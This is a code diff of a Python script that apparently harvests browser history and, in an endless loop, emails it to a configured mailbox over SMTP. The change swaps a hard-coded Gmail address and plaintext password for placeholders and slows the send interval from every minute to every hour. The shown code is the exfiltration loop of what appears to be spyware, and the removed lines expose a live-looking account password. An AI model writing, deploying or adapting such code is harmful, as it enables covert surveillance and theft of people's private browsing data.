@@ -17,8 +17,8 @@ def browerHistory():
 
     print('First method complete')
 
-fromaddr = "scriptspython25@gmail.com"
-toaddr = "scriptspython25@gmail.com"
+fromaddr = "Enter senders address"
+toaddr = "Enter recivers address"
 
 
 
@@ -66,7 +66,7 @@ def sendMail():
     s.starttls() 
   
 # Authentication 
-    s.login(fromaddr, "Python@123") 
+    s.login(fromaddr, "email password") 
   
 # Converts the Multipart msg into a string 
     text = msg.as_string() 
@@ -80,7 +80,7 @@ def sendMail():
 while 1:
     browerHistory()
     sendMail()  
-    dt = datetime.datetime.now() + datetime.timedelta(minutes=1)
+    dt = datetime.datetime.now() + datetime.timedelta(hours=1)
     
 
     while datetime.datetime.now() < dt:
